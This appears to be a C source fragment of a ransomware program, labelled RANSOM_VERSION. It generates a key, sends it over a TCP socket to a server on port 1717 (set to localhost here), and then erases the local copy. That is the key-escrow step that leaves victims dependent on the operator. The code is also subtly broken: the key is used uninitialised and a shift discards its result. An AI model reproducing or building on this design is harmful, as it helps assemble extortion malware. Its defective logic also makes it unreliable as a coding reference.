#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT 1717

#define RANSOM_VERSION 1
#define MAGIC_LEN 1000
#define MAGIC_KEY 2

int send_key(unsigned long key){
    int sock = 0;
    struct sockaddr_in serv_addr;

    // Create socket file descriptor
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    // Convert IPv4 and IPv6 addresses from text to binary form
    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) {
        perror("Invalid address/ Address not supported");
        exit(EXIT_FAILURE);
    }

    // Connect to the server
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("Connection Failed");
        exit(EXIT_FAILURE);
    }

    // Convert unsigned long to a byte array
    unsigned char buffer[sizeof(unsigned long)];
    for (int i = 0; i < sizeof(unsigned long); ++i) {
        buffer[i] = (key >> (i * 8)) & 0xFF;
    }

    // Send the byte array to the server
    send(sock, buffer, sizeof(unsigned long), 0);
    printf("Sent unsigned long value: %lu\n", key);

    close(sock);
}

void print_char_bits(char c) {
    for (int i = 7; i >= 0; i--) {
        printf("%d", (c & (1 << i)) ? 1 : 0);
    }
    printf(" magic\n");
}

unsigned long authorized_key(unsigned long key){
    char magic = (char)key;
    magic &= 0x0F;
    key = key << 1;
    key += 1;
    key = key << 4;
    key += magic;
    key = key << 1;    

    return key;
}

int validation_key(unsigned long key){
    char magic_1, magic_2;
    if(key % 2 != 0){
        printf("1\n");
        return 0;
    }

    key = key >> 1;
    magic_1 = (char)key;
    magic_1 &= 0x0F;

    key = key >> 4;

    if(key % 2 != 1){
        printf("2\n");
        return 0;
    }
    
    key = key >> 1;
    magic_2 = (char)key;
    magic_2 &= 0x0F;

    if(magic_1 != magic_2)  {
        printf("3\n");
        return 0;
    }
    return 1;
}
unsigned long generate_key(){
    unsigned long key;
    int i = 0;
    srand(time(NULL));  

    for(i = 0; i < sizeof(unsigned long); i += 2){
        key += rand();
        key << 2;
    }
    
    key = authorized_key(key);

    return key;
}


int main(void){
    {
        unsigned long key = generate_key();
        send_key(key);

        key ^= key;
    }    


    return 0;
}